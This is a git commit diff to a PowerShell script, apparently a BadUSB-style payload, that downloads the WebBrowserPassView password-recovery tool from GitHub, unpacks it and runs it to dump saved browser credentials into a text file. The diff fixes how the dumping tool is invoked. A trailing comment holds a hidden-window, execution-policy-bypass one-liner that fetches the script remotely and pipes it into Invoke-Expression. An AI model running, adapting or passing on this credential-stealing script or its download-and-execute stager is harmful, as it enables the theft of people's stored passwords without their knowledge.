0c39b981d62f859e14871e3772ee50f653d90924
MaxAxoft <167071721+MaxAxoft@users.noreply.github.com>
2024-04-15 14:53:07 +0200

    Update runner.ps1

--- runner.ps1
+++ runner.ps1
@@ -4,15 +4,15 @@ $runDirectory="$env:USERPROFILE\downloads"
 $zipFolder="$runDirectory\$nameFile.zip"
 $unzipFolder="$runDirectory\$nameFile"
 $exeFile="$unzipFolder\$nameFile.exe"
-$txtFile="$unzipFolder\$nameFile.txt"
+$txtFile="$nameFile.txt"
 
-$params="/stext"
+$params="/sfile $txtFile"
+
 
 Set-Location -path $runDirectory
 Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPassView.zip" -Method Get -OutFile $zipFolder
 Expand-Archive $zipFolder -DestinationPath $unzipFolder
-
-$exeFile $params $txtFile
+& "$exeFile" $params
 $txtFile
 
 #STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex
